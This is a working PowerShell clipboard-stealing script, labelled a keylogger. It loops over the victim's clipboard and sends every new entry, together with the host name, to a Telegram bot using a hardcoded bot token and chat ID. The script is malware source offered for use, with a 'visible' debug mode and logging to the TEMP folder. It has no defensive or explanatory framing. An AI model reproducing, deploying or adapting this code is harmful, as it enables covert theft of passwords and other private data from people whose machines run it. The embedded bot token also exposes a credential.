# keylogger.ps1 - Clipboard-based data capture
# Sends to Telegram with error logging
# VISIBLE VERSION - stays open for debugging

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$interval = 300 # 5 minutes
$lastClipboard = ""
$logFile = "$env:TEMP\keylogger_debug.log"

function Write-Log {
    param([string]$Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

Add-Type -AssemblyName System.Windows.Forms
Write-Host "[*] Keylogger loaded. Monitoring clipboard..." -ForegroundColor Green
Write-Log "[*] Keylogger started"

while ($true) {
    try {
        $clipboard = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipboard -and $clipboard -ne $lastClipboard -and $clipboard.Length -gt 3) {
            $lastClipboard = $clipboard
            $msg = "[+] CLIPBOARD`nHost: $env:COMPUTERNAME`nData:`n$clipboard"
            Write-Log "[Clipboard] New data captured ($clipboard.Length chars)"
            Write-Host "[+] Clipboard captured!" -ForegroundColor Green
            try {
                $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
                    chat_id = $chatId
                    text = $msg
                } -ErrorAction Stop
                Write-Log "[Telegram] Clipboard sent OK"
                Write-Host "[+] Clipboard sent to Telegram!" -ForegroundColor Green
            } catch {
                Write-Log "[Telegram] Clipboard FAILED: $($_.Exception.Message)"
                Write-Host "[-] Telegram failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    } catch {
        Write-Log "[Clipboard] Error: $($_.Exception.Message)"
    }
    Start-Sleep -Seconds $interval
}

# Keep window open
Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
